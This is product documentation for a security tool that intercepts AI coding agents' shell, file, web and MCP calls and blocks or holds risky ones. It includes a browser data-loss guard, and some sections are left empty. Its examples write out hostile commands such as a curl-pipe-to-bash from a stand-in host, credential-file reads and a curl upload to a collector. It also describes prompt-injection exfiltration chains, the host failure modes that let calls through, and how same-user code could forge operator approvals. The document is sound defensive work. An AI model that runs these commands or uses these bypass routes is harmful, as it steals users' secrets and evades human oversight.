Singularity AIDR for AI coding agents

Singularity AIDR (AI Agent Detection & Response) places a policy check between an AI coding agent and the things it touches: shell commands, files, web requests, packages, MCP tools and the user's prompt itself. Each supported agent host has a connector that hands the tool call to one shared, local decision engine (@singularityrd/aidr-core). The engine returns allow, ask or deny, and the connector turns that verdict into whatever the host understands.

This guide is written for security leaders, security engineers, IT administrators and procurement teams. It explains every feature of the AI-agent product line: what it does, why it matters, how it works, how to switch it on, and where its limits are. Every command, configuration key and file path below was taken from the repository.

Release status. Singularity AIDR is not yet released for live pilots or production deployment; the release record is docs/production-readiness/first-customer-ready.md. Platform and host rows in the native support matrix (deploy/native/support-matrix.json) are target scope. Real-host acceptance is recorded for Claude Code, Codex, OpenCode and OpenClaw only, on one host version each on linux/x64 with the development build and a scripted mock model; Cursor and VS Code have none, and no record covers Windows, macOS, arm64, a signed release or a real model. Treat the capabilities below as the designed and tested behaviour of the software, not as accepted host-side guarantees beyond those records. Tested host versions per connector are in the compatibility matrix (docs/compatibility-matrix.md).

Claude Code connector

What it does

The Claude Code connector is a plugin that registers four hooks. PreToolUse checks every tool call before Claude Code runs it and returns a verdict. PostToolUse inspects the tool's result. UserPromptSubmit checks the user's prompt before it reaches the model. SessionStart scans installed plugins. The plugin also bundles a small MCP server and a security-awareness skill.

Why it matters

Claude Code can run shell commands, edit files and fetch URLs on a developer's machine with that developer's privileges. A prompt-injected README or a malicious dependency can talk the agent into curl … | bash or a write to ~/.ssh/authorized_keys. The PreToolUse hook is the point where such a call can still be stopped.

How it works

Claude Code ──stdin JSON──▶ pre-tool-use.cjs ──▶ AIDR core ──▶ verdict JSON on stdout
   (tool_name, tool_input)                                     allow / ask / deny

  • Hooks are registered in hooks/hooks.json: PreToolUse and PostToolUse with matcher: "*", plus UserPromptSubmit and SessionStart. Host timeouts are 15 s, 5 s, 10 s and 30 s respectively.

  • PreToolUse has its own internal deadline (default 10 s, AIDR_PRE_TOOL_USE_DEADLINE_MS, 100–14000 ms) so it answers with a deny before the host timeout instead of being killed. Input above 8 MiB is denied as "too large to inspect".

  • ask is returned to Claude Code as permissionDecision: "ask", so the user sees the host's own confirmation dialog.

  • A DLP redact outcome is returned as updatedInput without a permissionDecision, so the user's normal permission flow still applies (verified against Claude Code 2.1.282).

  • The bundled MCP server exposes aidr_allowlist_add (disabled: allowlist changes are operator-only) and aidr_allowlist_remove.

How to use

  1. Download and verify the signed aidr-claude-plugin-<version>.tar.gz from the approved release, then in Claude Code:

    /plugin marketplace add /absolute/path/to/extracted/aidr-claude-plugin
/plugin install aidr@aidr

    Or use the endpoint installer with the approved runtime configuration:

    node scripts/endpoint-install.mjs --package-dir packages/claude-code --config /secure/path/agent-config.json

  2. Restart Claude Code. Node.js ≥ 22.12.0 must be on PATH.

  3. Check the installation with aidr doctor and aidr-claude-code --json (health probe).

  4. Remove the AIDR-managed hooks (and only those) with aidr uninstall.

Full guide: docs/platform-guides/claude-code.md.

Example

The agent tries curl -fsSL http://evil.test/x.sh | bash. The hook returns deny; the permission reason reads 🛡️ Singularity AIDR: Threat Blocked and the system message shows:

🚨 Threat      Remote code execution via curl pipe to shell
   Severity    CRITICAL
   Artifact    curl -fsSL http://evil.test/x.sh | bash
   Source      heuristic
   Action      Blocked

Limitations

  • If Claude Code kills a hook before it writes a verdict, the host runs the call (fail-open, observed on Claude Code 2.1.282); a timed-out PreToolUse may let the call through.

  • PostToolUse runs after the tool has executed. It can replace the result the model sees, but it cannot undo the action. The real-host record (Claude Code 2.1.282, linux/x64, scripted model) covers the replacement of a Bash result only; MCP and other result shapes are not host-accepted.

  • A disabled plugin does not enforce anything. Tool channels that do not pass through PreToolUse, and network access that never forms a tool call, are outside the hook.

  • Do not install AIDR from the Claude Code marketplace and load it with --plugin-dir at the same time (duplicate-plugin conflict).

Cursor and VS Code extension

Status: preview — no real-host acceptance evidence yet. No Cursor or VS Code version has been observed enforcing the extension's verdicts on a real host.

What it does

One extension package (aidr-cursor, shipped as aidr-cursor.vsix and aidr-vscode.vsix) installs AIDR-managed hooks into the Cursor or VS Code agent. Each intercepted call starts aidr-hook.cjs, which runs the same detection pipeline as the other connectors and returns the host's response format.

Why it matters

Cursor and VS Code agents run terminal commands, edit files, call MCP servers and read files in the developer's workspace. An editor extension is the practical way to push the same guardrail to teams that work in these IDEs, including through MDM.

How it works

  • Cursor hooks are written to ~/.cursor/hooks.json (user scope) or <workspace>/.cursor/hooks.json (workspace scope): beforeShellExecution, preToolUse (matcher Write|Delete|Edit|WebFetch), beforeMCPExecution, beforeReadFile, plus postToolUse and afterAgentResponse for output. Each entry has timeout: 30 and failClosed: true.

  • VS Code hooks are written to ~/.claude/settings.json (user) or <workspace>/.claude/settings.json (workspace): PreToolUse with matcher Bash|WebFetch|Write|Edit|Read|Delete|editFiles, and PostToolUse.

  • Hooks always exit with code 0; the host reads the JSON response to decide.

  • Cursor preToolUse cannot enforce an ask, so the extension returns an explicit deny there. Other Cursor events and VS Code receive ask as is.

How to use

  1. Install the signed VSIX from the approved release via Extensions > Install from VSIX (or push it through MDM).

  2. VS Code only: enable chat.useClaudeHooks in User Settings first. The extension checks this prerequisite but does not change it.

  3. Open the command palette and run Singularity AIDR: Enable protection.

  4. Choose where hooks go with aidr.cursor.scope / aidr.vscode.scope (user by default, or workspace).

  5. Other commands: Disable protection, Open config, Open audit log, Show hook health.

Full guide: docs/platform-guides/cursor.md.

Example

In Cursor the agent tries to edit ~/.ssh/authorized_keys. preToolUse returns permission: "deny" with the reason Access SSH authorized_keys (unauthorized access persistence) shown to the user and the agent message Singularity AIDR blocked this action (critical).

Availability

PlanDeploymentPlatforms / OS
Free, Team, Business, EnterpriseLocal; also under a Cloud, On-prem or Air-gapped control planeWindows, Linux, macOS (x64, arm64) target scope; installed Cursor or VS Code

Limitations

  • No real-host acceptance is recorded: a returned deny does not by itself prove that the host prevented the side effect, and host handling of a killed or timed-out hook is unverified.

  • A disabled extension, commands run in an external terminal, and unmapped tools are not covered.

  • Output: Cursor MCP-output replacement is unverified on a real host; non-MCP output is advisory; VS Code PostToolUse cannot replace bytes already returned; Cursor afterAgentResponse is observation-only. Tenant DLP policy does not apply to output.

  • VS Code user-scope hooks share ~/.claude/settings.json with Claude Code.

OpenClaw connector

What it does

An in-process OpenClaw plugin. It inspects exec, web_fetch, write, edit, read and apply_patch in before_tool_call, replaces risky tool output before it is written to the transcript, and checks outbound messages before channel delivery. It also scans installed OpenClaw extensions when the gateway or a session starts.

Why it matters

OpenClaw agents often run unattended and deliver answers to chat channels. A leaked credential or an injected instruction can travel both into a tool call and out into a message; this connector watches both boundaries.

How it works

  • before_tool_call runs the full pipeline and blocks the call on deny and ask.

  • Tool-result middleware (OpenClaw 2026.9+, embedded runner) replaces a risky tool result with a quarantine notice before the model receives it; after_tool_call observes output; tool_result_persist replaces risky text before it is persisted; message_sending and reply_payload_sending replace a risky outbound reply with a non-echoing notice. Text scanning is bounded to 256 KiB.

  • before_agent_run gates the user's prompt before the model reads it (prompt protection; embedded and CLI runners); before_prompt_build adds plugin-scan findings and prompt-protection warnings as context for the model.

  • Every ask is recorded in the operator approval store; there is no agent-callable approval tool. aidr_allowlist_add / aidr_allowlist_remove are registered, and aidr_allowlist_add refuses unless an operator granted --permit-allowlist.

  • In paranoid sensitivity, ask is promoted to deny.

How to use

  1. Configure the private registry (docs/package-installation.md).

  2. Install the approved version:

    openclaw plugins install npm:@singularityrd/aidr-openclaw@VERSION

  3. Commercial releases need the artifact-verification public key in ~/.singularity-aidr/config.json (integrity.public_keys_pem) before any hook is registered.

Full guide: docs/platform-guides/openclaw.md.

Example

The agent calls exec with cat ~/.aws/credentials. The call is blocked and the model receives:

Singularity AIDR flagged this action and blocked it pending explicit user approval.
Severity: warning
Category: secrets
Reason: Reading credential or secret file
...
Approval reference: actionId: "<actionId>"
You cannot approve this action yourself and no tool available to you can approve it.

The user reviews it with aidr pending and, if appropriate, runs aidr approve <actionId> in their own terminal.

Availability

PlanDeploymentPlatforms / OS
Free, Team, Business, EnterpriseLocal; also under a Cloud, On-prem or Air-gapped control planeWindows, Linux, macOS (x64, arm64) target scope

Limitations

  • OpenClaw offers no host-native confirmation dialog, so approval happens in a separate terminal and the user then asks the agent to retry.

  • Output hooks are post-execution: they cannot undo the tool action. Same-turn containment of a risky tool result relies on the tool-result middleware, which needs OpenClaw 2026.9+, the embedded runner (not the Codex harness) and plugins.entries.aidr-openclaw.enabled: true. Provider token streams are not intercepted.

  • OpenClaw's plugins.code_safety audit may show a potential-exfiltration warning because file reads and network requests coexist in the bundle; review the actual configuration and egress.

OpenCode connector

What it does

An OpenCode plugin that inspects bash, webfetch, read, write, edit, apply_patch, ls, glob and grep in tool.execute.before, replaces risky tool output in tool.execute.after, and scans installed OpenCode plugins when a session is created.

Why it matters

OpenCode runs with a developer's shell and file access. Patch-based edits are a common way to hide a write to a sensitive path; this connector parses every target of an apply_patch so the hidden write is visible to the rules.

How it works

  • apply_patch patchText is normalised to every target path and added-content section; an unparseable patch is blocked.

  • deny and ask block the call. An ask returns an actionId and is recorded in the operator approval store. DLP redact rewrites output.args in place (a failed rewrite blocks).

  • tool.execute.after replaces risky, oversized or unsupported output with a quarantine notice where the result shape allows it, and emits aidr.output_inspection.health / aidr.output_inspection.coverage events.

  • Unmapped tools pass through unchanged.

How to use

  1. Declare the exact approved version in ~/.config/opencode/package.json:

    { "dependencies": { "@singularityrd/aidr-opencode": "VERSION" } }

  2. Enable the plugin in ~/.config/opencode/opencode.json:

    { "plugin": ["@singularityrd/aidr-opencode"] }

  3. Verify with the safe, non-executing deny canary in deploy/FIRST_CUSTOMER.md.

Full guide: docs/platform-guides/opencode.md.

Example

The agent submits an apply_patch whose second hunk is *** Add File: /home/dev/.ssh/authorized_keys. AIDR evaluates that target like an edit, rule CLT-FILE-002 matches, and the call is blocked with Singularity AIDR blocked this action.

  • No in-session approval prompt (upstream host API not available); approval happens in a separate terminal.

  • Output replacement for raw MCP results works only for mutable plain-data objects; otherwise AIDR reports replacement_unavailable and the original may remain visible. Host acceptance of the replacement before same-turn consumption is not established.

Codex CLI connector

What it does

@singularityrd/aidr-codex is a native PreToolUse command hook for the OpenAI Codex CLI. It evaluates Bash and apply_patch calls with the shared detection core before Codex runs them. It was verified against codex-cli 0.141.0.

Why it matters

Codex treats nearly every hook malfunction as "proceed". A connector that simply returned AIDR's verdict would leak ask verdicts and errors straight through. This connector is written to give Codex the only answer it honours: a well-formed deny with a non-empty reason.

How it works

codex (PreToolUse) ──stdin JSON──▶ aidr-codex-hook ──▶ AIDR core
                                          ├─ allow → no output, call proceeds
                                          └─ block → explicit deny + reason
Hook behaviourCodex resultWhat AIDR does
permissionDecision: "deny" with a reasonBlocksUsed for every block
permissionDecision: "ask"ProceedsNever emitted: ask → deny
deny with an empty reasonProceedsReason is never empty
Crash, timeout, malformed JSONProceedsInternal errors and unreadable input become an explicit deny
Hook not trustedNever runsOperator must trust the hook

  • apply_patch bodies are inspected, including every *** Update/Add/Delete File: target. Shell commands sent as argv arrays (["bash", "-lc", "…"]) are inspected too.

  • Codex starts each hook in a fresh process, so every ask is written to the file-backed operator approval store (~/.singularity-aidr/approvals.json).

  • A DLP redact outcome is denied (Codex runs the original input when it rejects a rewrite).

How to use

  1. Deploy the approved runtime configuration as ~/.singularity-aidr/config.json (commercial builds need the Ed25519 artifact-verification public key).

  2. Install:

    npm install --global @singularityrd/aidr-codex@VERSION

  3. Register the hook in ~/.codex/config.toml (the event name must be PascalCase):

    [[hooks.PreToolUse]]
matcher = "^(Bash|apply_patch)$"

[[hooks.PreToolUse.hooks]]
type = "command"
command = "aidr-codex-hook"
timeout = 10

  4. Trust the hook with /hooks in Codex. An untrusted hook is silently dropped.

  5. Verify: node scripts/verify-codex-hook.mjs and aidr-codex-hook --health.

Full guide: docs/platform-guides/codex.md and packages/codex/README.md.

Example

Codex proposes cat ~/.aws/credentials. AIDR's verdict is ask; Codex receives permissionDecision: "deny" with a reason containing the approval reference. The operator runs aidr approve <actionId>, and the next identical call in the same Codex session is released once.

  • Codex owns the failure policy: a disabled, untrusted or killed hook lets the call through. AIDR on Codex is a guardrail at the hook boundary, not endpoint isolation.

  • Only Bash and apply_patch are covered. Tool output, MCP tools and other local function tools outside the matcher, and hosted tools such as web search are not.

2. Detection

Local detection engine and threat rules

What it does

The engine extracts artifacts (commands, URLs, file paths, content, packages) from each tool call and matches them against YAML threat rules. The rules are data, not code: 507 rules in 29 files under threats, covering Linux, macOS and Windows.

Why it matters

Most damaging agent actions follow known shapes: download-and-execute chains, reverse shells, credential file reads, persistence, miners, defence evasion. Matching them locally stops the call without sending anything off the machine.

How it works

tool call → extract artifacts → allowlist? → cache? → rules + policy + optional
reputation legs → decision engine (deny > ask > allow) → cache → audit log → verdict

Each rule has id, category, severity, confidence (0–1), action (block → deny, require_approval → ask, log → allow), a regex pattern, match_on, title, expires_at and revoked. Of the 507 rules, 219 block, 260 require approval and 28 log; 175 are critical, 305 high and 27 medium. The 27 secure-code.yaml rules are advisory: they only inspect code the agent writes, and secure_code.action (warn by default, or ask) decides what a match does.

Sensitivity presets

What it does

A single sensitivity setting chooses the confidence threshold at which a blocking signal becomes a deny rather than an ask.

Why it matters

Different teams accept different trade-offs. A security research team may want every suspicion blocked; a build farm may want only high-confidence malware blocked.

What it does

Why it matters

Toxic-flow detection

What it does

Tracks what each agent session has done and flags the call that would complete a dangerous combination, even when every single step looks harmless on its own.

Why it matters

Many real attacks only show up as a sequence: the agent reads a credential file, later fetches a page carrying an injected instruction, then "posts a summary" to an external URL. Single-call rules cannot see that chain.

How it works

The session record tracks three capabilities, following the widely discussed "lethal trifecta" idea: A private data access (credential and secret files, secret-printing commands, database dumps, secrets found in tool output), B untrusted content (web fetches, untrusted MCP output, files downloaded in the session, flagged tool output) and C external communication (egress to non-trusted hosts, uploads, email, MCP send tools, paste services).

ChainRuleFires when
Lethal trifectaAIDR-FLOW-001This call would give the session A + B + C
Exfiltration chainAIDR-FLOW-002Secret-grade material was read and this call sends a payload out
Injection to actionAIDR-FLOW-003Untrusted content entered the session and this call runs a destructive command
Bulk sensitive accessAIDR-FLOW-004Distinct sensitive files read in the window reach the threshold (default 5)

Steps count for toxic_flow.window_minutes (default 60). The reason names the chain and the earlier steps by tool and target only, never request bodies or file contents. Each session record is HMAC-protected; a tampered record is treated as a session that already has all three capabilities, not as a clean slate.

How to use

On by default. toxic_flow.action: auto (default: ask in balanced and relaxed, deny in paranoid), ask, deny or monitor (audit only, for tuning). Details: docs/toxic-flow.md.

Example

An agent reads ~/.aws/credentials and four minutes later runs curl -d @- https://collector.example. The second call is held: "Toxic flow "exfil_chain": this call sends data to an external destination after secret material was read in this session."

Free, Team, Business, EnterpriseLocal; Cloud, On-prem, Air-gappedAll six connectors and the MCP Gateway; Windows, Linux, macOS

Limitations

  • Classification is heuristic; a custom binary that uploads data is not recognised as external communication.

  • Taint is tracked per session, not across sessions or agents; a moved or renamed download is no longer tracked.

  • Codex does not inspect tool output, so secrets seen only in output do not feed the session there.

Canary credentials

What it does

Plants decoy secrets (AWS, GitHub and OpenAI keys, .env backups, an SSH config entry, a database URL) that no legitimate task uses. An agent that opens one, searches it or sends its value anywhere is blocked, and the trigger is recorded.

Why it matters

A tripwire catches a hijacked agent the moment it goes looking for credentials, even when its individual commands look ordinary.

How it works

  • aidr canary deploy creates the decoys without ever overwriting a file (O_EXCL, mode 0600). Values are freshly random and never valid with any provider.

  • The registry stores only SHA-256 digests of the values, inside the AIDR state directory that the self-defence rules keep out of the agent's reach.

  • Before a tool runs, a call that names a decoy path or carries a decoy value (also percent-, \u- or base64-encoded) is denied (AIDR-CANARY-001 / -002), ahead of every allowlist, cache or reputation lookup. Tool output that contains a decoy value is quarantined (OUT-CANARY-001).

  • Rule CLT-CANARY-001 blocks an agent that runs aidr canary … itself.

How to use

aidr canary deploy --path ~/work/payments
aidr canary list
aidr canary status          # non-zero exit when a decoy is missing or changed
aidr canary remove --all

Add the project decoy names to .gitignore; AIDR never edits it. Details: docs/canary-tokens.md.

Example

cat .env.backup inside the project is denied with category canary_triggered. In managed mode an incident labelled Canary triggered appears on the Incidents page.

Availability

PlanDeploymentPlatforms / OS
Free, Team, Business, EnterpriseLocal; incidents in Cloud, On-prem, Air-gappedAll six connectors; Windows, Linux, macOS

Limitations

  • A value that is split, reversed or encrypted before use is not recognised.

  • Directory-wide reads (grep -r) that do not name a decoy are caught in the output, not before they run.

  • Browser Guard treats decoys as ordinary secrets and does not count them separately.

Agent permission profiles

What it does

Declares least privilege per agent: which tool classes, command prefixes, file paths, network domains and MCP servers or tools are in scope, and what happens to everything else. Profiles are scoped to connectors and, optionally, to repositories.

Why it matters

Threat rules catch known-bad actions. A profile limits what an agent may do at all, so a review-only agent cannot push and a CI agent cannot reach arbitrary hosts.

How it works

  • Four templates ship: read-only-reviewer, standard-developer, ci-agent and locked-down. All of them deny credential locations.

Secure-code guardrails

What it does

Checks the code an agent writes, as it writes it, for common insecure shortcuts, and tells both the developer and the agent what to fix.

Why it matters

How it works

Data loss prevention (DLP)

What it does

DLP evaluates the serialized tool input (and the user's prompt, on every connector with prompt protection) against a policy of labels and rules. Rules use keywords, regular expressions or built-in Turkish/English detectors, and act with block, ask or redact.

Why it matters

Agents copy data between files, commands and web requests. A customer list pasted into a curl body, a TC Kimlik number in a test fixture sent to an external API, or an internal code name in a commit message are data-loss events that threat signatures do not catch.

How it works

  • Policy source.

    ModeSourceSignature
    managed~/.singularity-aidr/detectors/<runtime>.json (runtime: claude-code, cursor, vscode, openclaw, opencode, codex), authored in the dashboard under PoliciesEd25519-signed, bound to the verified tenant entitlement; unsigned or tampered bundles block tool calls
    local~/.singularity-aidr/dlp-policy.json (or AIDR_DLP_POLICY_PATH)Unsigned; written by the machine's operator

  • Matchers. keyword (up to 500 values), regex (max 512 characters; unsafe constructs rejected) and detector. The 18 built-in detectors: tc_kimlik, iban, phone, email, credit_card, us_ssn, address, person, date_of_birth, passport, national_id, tax_id, bank_account, ip_address, mac_address, secret, private_key, classified. Checksum-validated identifiers (TC Kimlik, IBAN mod-97, Luhn cards) need no label; contextual types need a label or phrase next to the value.

  • Built-in PII baseline. While any DLP policy is active, tool input is also checked for six common PII types under reserved rule IDs: pii-ssn (dashed form), pii-credit_card (Luhn-valid, known network), pii-email, pii-phone, pii-tc_kimlik and pii-iban (checksum-validated). Without a rule of that ID the baseline blocks; a rule with that ID and "enabled": false switches that type off; a rule with action: "ask" asks, while block and redact deny. Bare digit runs such as timestamps, order IDs or hashes are not treated as PII.

  • Exceptions are time-bounded and attributable (scope: rule, match or content); match and content exceptions store SHA-256 fingerprints, never the value.

  • Redaction per connector. A redaction is applied only when the redacted input keeps every parameter name and a rescan finds nothing left; otherwise the call is denied.

    Connectorredact outcome
    Claude CodeAllowed with redacted input via updatedInput (normal permission flow still applies)

4. Operations and governance

Operator approvals

What it does

For hosts without a native approval dialog (OpenClaw, OpenCode, Codex), every ask is recorded as a pending ask. A human operator reviews it in their own terminal and can release one retry of that exact call.

Why it matters

Approval must be something the policed agent cannot do. If the agent could call an approval tool, a prompt injection could approve its own block. The operator channel keeps approval out of band.

How it works

  1. The connector writes the pending ask to ~/.singularity-aidr/approvals.json: the actionId (SHA-256 of tool, input and session), a digest of the artifact set, tool, connector, a redacted summary and a one-hour expiry. Raw values and the session ID are not stored.

  2. aidr pending lists open asks; aidr approve <actionId> shows what will be released and requires the operator to type approve in an interactive terminal.

  3. The approval expires after 15 minutes (--ttl <minutes>, 1–1440) and is single-use: the first identical retry (same tool, artifacts and session) spends it. A deny, including a paranoid-promoted ask, is never released.

  4. --permit-allowlist additionally lets the agent's aidr_allowlist_add tool turn each approved artifact into one permanent allowlist entry.

  5. Every record carries an HMAC-SHA256 under a per-install key stored in the OS vault (Windows DPAPI, macOS Keychain, libsecret secret-tool) under aidr-operator-approval-key, or in ~/.singularity-aidr/operator-approval.key (AIDR_SECRET_STORE=file-acl). Edited or foreign-key records are refused. The store is written atomically with mode 0600, bounded to 200 pending asks and 200 approvals.

How to use

aidr pending
aidr approve <actionId>                    # interactive, types "approve"
aidr approve <actionId> --ttl 5 --json     # shorter window, machine-readable receipt
AIDR_OPERATOR_NONINTERACTIVE=1 aidr approve <actionId> --yes   # automation only

Example

aidr pending shows:

1 ask(s) waiting for an operator decision (newest first):

  actionId:   <actionId>
  connector:  codex   tool: Bash
  risk:       warning secrets (CLT-CRED-004)
  ...
Approve one retry of a call with: aidr approve <actionId>

After approval: "Tell the agent to retry the same call; the approval is spent by that one retry."

  • This channel is designed to stop a prompt-injected agent from approving its own block through its tools. It is not a boundary against code already running as the same OS user with unrestricted shell access: such code can read the key, mint a record, allocate a pseudo-terminal or set AIDR_OPERATOR_NONINTERACTIVE.

  • Layered mitigations: agent tool calls normally have no TTY; self-defence rule CLT-SELF-007 flags an agent command that runs aidr approve / aidr allowlist add, sets AIDR_OPERATOR_NONINTERACTIVE or touches the store or key, and CLT-SELF-002 does the same for file tools; every release is audited as a user override.

  • Rotating the key (deleting the key file or vault entry) invalidates every outstanding record.

  • Claude Code and VS Code use the host dialog instead; Cursor preToolUse asks are denied and are not recorded in this store.

Dashboard approvals

What it does

In managed mode, an ask can be approved by an owner or administrator on the dashboard Approvals page: a different, authenticated person on a different device, instead of only the same-user aidr approve command.

Why it matters

The terminal channel runs as the same OS user as the agent. A second person in the console, with multi-factor authentication and a recorded reason, is a stronger separation.

How it works

  1. The connector (never the agent) files a request with its tenant key: installation, action id, artifact digest, tool, threat ids, a redacted summary and an expiry of at most 30 minutes. The call stays blocked, and the block reason names the request id.

  2. An owner or admin reviews it on /approvals (a pending-count badge appears in the navigation). Approve and deny both need a reason and an AAL2 (multi-factor) session; the decision and reason go to the audit log in the same transaction.

  3. The control plane signs an Ed25519 approval token bound to tenant, installation, action, artifact digest and tool, valid for 15 minutes and single-use. The connector verifies it against keys from its signed entitlement and releases exactly one identical retry.

Any failure (network, bad token, unknown key, mismatch, expiry, replay) keeps the call blocked. There is no agent-callable approval.

Enrol the agents in managed mode, then open Approvals in the dashboard. Alert channels can announce new approval requests (Alert integrations).

Attack simulation (aidr simulate)

What it does

Runs a defensive self-test: a corpus of harmless, defanged attack samples is fed to AIDR's own evaluator under your effective settings, and the report scores what was detected. Nothing is ever executed.

Why it matters

It shows, on your own machine and configuration, that the rules load and catch the behaviours they describe, and it can gate CI when detection drops after a policy change.

How it works

Suites: injection, exfiltration, destructive, encoding, supply-chain, mcp, self-defense, privacy. Every fixture uses reserved endpoints and visibly fake credentials. Each risky sample has a benign twin, so the report gives both a detection score and a benign false-positive rate. The run uses a throwaway home directory, forces local mode and switches off network and persistence; results from inert offline reputation legs are excluded from the score rather than counted as clean.

MCP Gateway

What it does

@singularityrd/aidr-mcp-gateway is a loopback HTTP gateway (plus a stdio bridge) between an MCP client and remote MCP servers. It checks every tools/call before the upstream server runs it and checks the result before the model sees it.

Why it matters

MCP servers expose powerful tools and return untrusted content. A changed tool description can smuggle instructions; a tool result can carry an injection or a secret. Hosts such as Codex do not hook MCP tools at all.

How it works

For each tools/call, in order, stopping at the first failure:

  1. Authentication and scope: per-client bearer token (stored as SHA-256), explicit per-tenant tool allowlist.

  2. Manifest attestation: Ed25519-signed tool manifest, approved by an operator; the live tools/list must match exactly.

  3. Argument schema: bounded, ReDoS-resistant JSON Schema subset.

  4. Threat and DLP evaluation: normalised to mcp__<serverId>__<toolName> and run through the same evaluateToolCall pipeline (rules, allowlist, policy, server dlpPolicy).

  5. Upstream call over a pinned-DNS transport that rejects redirects and private addresses.

  6. Result inspection: text fully buffered and scanned; binary output only for allowlisted, byte-verified MIME types (PNG/JPEG/GIF/WebP by default, 256 KiB decoded).

Blocked calls return JSON-RPC error -32001 with arguments_blocked (deny), approval_required (ask, operatorActionRequired: true) or detection_unavailable. Server-initiated sampling, elicitation, roots and notifications follow the serverInitiated policy (deny by default, or ignore); the gateway strips those capabilities from the forwarded initialize. A new or changed toolset is quarantined until an operator approves it with aidr-mcp-approve, which is never an MCP tool or HTTP endpoint.

How to use

node packages/mcp-gateway/dist/aidr-mcp-gateway.mjs /secure/path/gateway.json

node packages/mcp-gateway/dist/aidr-mcp-approve.mjs /secure/path/gateway.json \
  tenant-a server-a <toolsetHash> <bindingSha256> <operatorId> "approved ticket and reason"

For stdio clients use dist/aidr-mcp-stdio.mjs with the token in an environment variable. Guides: docs/platform-guides/mcp-gateway.md, packages/mcp-gateway/README.md.

AIDR Browser Guard and AIDR Privacy

People paste customer records, contracts, source code and credentials into AI chat products every day. AIDR Browser Guard is a browser extension that checks what is about to be sent to those products (typed prompts, pasted text and uploaded files). Before the site receives anything, it replaces personal and confidential values with reversible placeholders such as [EMAIL_1]. AIDR Privacy is the Turkish/English detection engine underneath: its rule layer runs inside Browser Guard, and the same package holds optional components (a command-line scanner, screenshot OCR redaction, document reconstruction and a server gateway) that are at different levels of maturity.

This guide is written for CISOs, security engineers, IT administrators and procurement teams. 2. Send interception with fail-closed behaviour

What it does — Before the site's own code sees a prompt, the extension stops the send, scans the text and then either lets it go, rewrites it, asks the user or blocks it. If it cannot check the prompt properly, it does not send it.

Why it matters — A guard that silently lets text through when something goes wrong gives false assurance. Say the policy has not loaded yet, the prompt box cannot be read, or a 500 KB paste exceeds the scan limit. In each case the safe outcome is "not sent, here is why", not "sent unchecked".

How it works — The content script listens in the capture phase for Enter (not Shift+Enter, and not while an input method is composing text; Ctrl/Cmd+Enter is also treated as send), for clicks on the send button and for form submits. After the decision it replays the send exactly once, and only if the editor still holds the checked text. Text is pre-scanned in the background while the user types. A prompt already known to be clean then passes with the original, trusted event untouched.

3. Sensitive-data detection coverage

What it does — Detects 23 entity types in Turkish and English text. Structured identifiers use checksums, and free-form data uses labelled fields and cue words. Detection runs in the page, with no network access, using the AIDR Privacy rule layer.

Why it matters — The data that most often leaks into prompts has a recognisable shape: Turkish national IDs (TC Kimlik), IBANs, card numbers, phone numbers, email addresses and API keys. Checksums let the guard mask real identifiers and ignore look-alikes, which keeps false positives low enough that users do not learn to ignore the tool.

How it works — Every prompt is normalised into several detection views. Unicode is normalised, and zero-width and bidi control characters are dropped for detection only. URL percent-encoding, HTML entities and \u{…} escapes are decoded. Each view is scanned, and spans are mapped back to the original text and merged. Opaque content (long base64, 64-character hex hashes, data: URIs) is not treated as sensitive in itself. Luhn-valid digit runs without a card label must start with a card-network digit (2–6), which removes epoch-millisecond timestamps and order numbers.

4. Reversible placeholders and local restore

What it does — Replaces each sensitive value with a numbered placeholder such as [EMAIL_1] or [TCKN_2], so the AI can still reason about "the customer's email". When the answer comes back with the placeholder, the original value is shown in its place, only inside the user's browser. Secrets and private keys are masked but never shown again.

Why it matters — A plain [REDACTED] destroys meaning, so users bypass the tool to get useful answers. Reversible placeholders keep answers usable ("Draft an email to [EMAIL_1]…") while the AI provider never receives the real value.

How it works

  • Consistent numbering. The same value gets the same placeholder within a page (emails compared case-insensitively; phone, TC Kimlik, card and SSN compared by digits only; IBAN by its compact upper-case form). Numbers are never reused while the page is open, so an old answer cannot be "restored" to a different person's value.

  • Session memory only, per tab. The placeholder-to-value map (the "vault") lives in the content script's memory. After every mask and every send the content script hands a copy to the background worker, which keeps it in chrome.storage.session (memory-backed, cleared when the browser closes) under the tab id and the site's origin. That area is restricted to the extension's trusted contexts, so neither the AI site nor the content script can read it directly; another tab or another site gets nothing. After a reload the page gets its vault back, together with the list of placeholders already sent from that tab, so answers (and history the site re-renders) are restored again. Types in neverRestore are never copied. Closing the tab deletes the copy, and so does 4 hours without a save. The vault is never written to chrome.storage.local or disk and never sent over the network. Entries unused for 4 hours are forgotten, and at most 10,000 entries are kept (least recently used first out).

  • Restore without exposing values to the page. The restorer touches only text nodes in answers and in the user's own sent messages, never the prompt editor. The original is drawn inside a closed shadow root, while the page's own DOM still holds the placeholder. The chat site's scripts (copy buttons, analytics, session replay) therefore keep reading [EMAIL_1], while the user sees the original. The real-browser suite checks both sides.

  • Tolerant matching. Placeholders are recognised even when the model escapes or decorates them (EMAIL\_1, **EMAIL_1**, `EMAIL_1`, missing brackets).

  • neverRestore. Types in this list (default SECRET, PRIVATE_KEY) are masked but never restored or revealed in a tooltip.

How to use

  • Popup toggle Show original values in responses switches restore for the current view (the restored text reverts to placeholders when switched off).

  • Options → Protection → Restore original values in responses (restoreResponses, default on).

  • Managed keys: restoreResponses (boolean), neverRestore (entity list). In the options page, never-restore types carry the tag Never shown ("Always stays masked, even in responses.").

Example — The user sends Please email ayse.yilmaz@example.com about the refund, deploy key sk-proj-…. The site receives Please email [EMAIL_1] about the refund, deploy key [SECRET_1]. The answer "I emailed [EMAIL_1]; rotate [SECRET_1]" is shown to the user as "I emailed ayse.yilmaz@example.com; rotate [SECRET_1]", with the tooltip "Restored locally by AIDR".

DeploymentLocal / Cloud / On-prem / Air-gapped
PlatformsChrome, Edge, Firefox (desktop)

Limitations

  • The mapping survives a reload of the same tab on the same site (covered by the real-browser reload-restore scenario). It does not survive closing the tab, a browser restart, 4 hours without a save, or opening the conversation in another tab. It is also lost when the background worker does not answer within 1.5 seconds while the page loads. Placeholders already in the conversation then stay as placeholders.

  • After a reload, a placeholder sent from that tab earlier is restored anywhere in the conversation, including history the site had already rendered. Before the reload it is restored only in content that appeared after the send.

  • Only text the site renders in the page is restored. Content the site exports, copies to the clipboard itself or shares by link contains the placeholders.

  • If the model rewrites a placeholder beyond the tolerated forms (for example translates it), it cannot be restored.

  • JavaScript strings cannot be securely wiped from memory. This is a platform limit.

7. File and upload protection

